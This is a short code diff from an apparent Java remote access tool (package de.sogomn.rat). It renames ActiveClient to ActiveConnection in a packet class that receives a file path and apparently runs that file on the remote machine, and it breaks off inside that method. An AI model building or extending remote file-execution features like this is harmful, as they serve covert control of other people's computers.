@@ -5,7 +5,7 @@ import java.awt.Desktop.Action;
 import java.io.File;
 import java.io.IOException;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class ExecuteFilePacket implements IPacket {
 	
@@ -20,17 +20,17 @@ public final class ExecuteFilePacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	public void send(final ActiveConnection client) {
 		client.writeUTF(path);
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
+	public void receive(final ActiveConnection client) {
 		path = client.readUTF();
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
+	public void execute(final ActiveConnection client) {
 		final boolean desktopSupported = Desktop.isDesktopSupported();
 		final File file = new File(path);
 		
